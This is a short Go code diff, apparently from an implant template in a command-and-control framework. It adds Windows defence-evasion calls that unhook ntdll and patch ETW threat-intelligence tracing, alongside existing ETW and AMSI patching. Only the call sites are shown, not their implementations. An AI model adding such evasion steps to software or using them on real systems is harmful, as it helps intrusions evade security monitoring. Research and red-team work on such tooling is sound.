@@ -122,9 +122,10 @@ func Main() {
 	limits.ExecLimits() // Check to see if we should execute
 
 	// {{if eq .Config.GOOS "windows"}}
+	evasion.UnhookNtdllFromKnownDlls()
 	evasion.PatchETW()
+	evasion.PatchETWThreatIntel()
 	evasion.PatchAMSI()
-	evasion.RefreshPE("ntdll.dll")
 	evasion.RefreshPE("kernel32.dll")
 	// {{end}}
 
